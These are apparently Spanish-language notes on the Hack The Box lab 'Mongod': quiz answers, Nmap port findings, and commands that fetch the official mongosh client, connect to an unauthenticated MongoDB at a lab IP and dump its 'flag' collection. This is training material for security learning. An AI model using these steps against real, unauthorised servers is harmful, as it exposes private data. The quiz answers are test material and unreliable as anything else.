Vamos a ver [[mongodb]] en esta maquina

1)¿Cuántos puertos TCP están abiertos en la máquina?
	2

2)¿Qué servicio se ejecuta en el puerto 27017 del host remoto?
	MongoDB 3.6.8

3)¿Qué tipo de base de datos es MongoDB? (Elija: SQL o NoSQL)
	NoSQL

4)¿Cuál es el nombre del comando para el shell de Mongo que se instala con el paquete mongodb-clients?
	mongosh

5)¿Cuál es el comando utilizado para listar todas las bases de datos presentes en el servidor MongoDB? (No es necesario incluir un ; al final)
	show dbs

6)¿Cuál es el comando utilizado para listar las colecciones de una base de datos? (No es necesario incluir un ; al final)
	show collections
	En MongoDB, una **colección** es como una **tabla en SQL**, pero más flexible.  
	Contiene **documentos** (que serían como filas), pero **no requieren un esquema fijo**.
	Por ejemplo, en una base de datos de usuarios, podrías tener una colección llamada `usuarios` que guarda todos los perfiles en forma de documentos JSON.

7)¿Cuál es el comando utilizado para volcar el contenido de todos los documentos de la colección denominada flag en un formato fácil de leer?
	db.flag.find().pretty()


---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

![[Mongod1.png]]

![[Mongod2.png]]

Por el ttl la maquina es linux, y que esta abierto el puerto 22 ssh y el 27017 que es de mongodb

# Intrusion por [[mongodb]]

Descargamos el binario para ejecutar mongodb
```shell
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
tar xvf mongosh-2.3.2-linux-x64.tgz
cd mongosh-2.3.2-linux-x64/bin
./mongosh mongodb://10.129.228.30:27017
```
Usando el binario de mongodb. Ganamos acceso a la maquina
![[Mongod3.png]]

Una vez dentro, vamos a usar estos comandos para manejarnos por la base de datos, y a posteriori visualizamos la flag
```mongodb
show dbs
use sensitive_information
show colletions
db.flag.find().pretty()
```
![[Mongod4.png]]

# Notas
Una base de datos es sql, cuando tiene el modelo tradicional de bases de datos que son tablas,columnas,filas,etc. Y cuando no tiene esto es una base de datos NOSQL


# Creditos
Writeup Oficial HackTheBox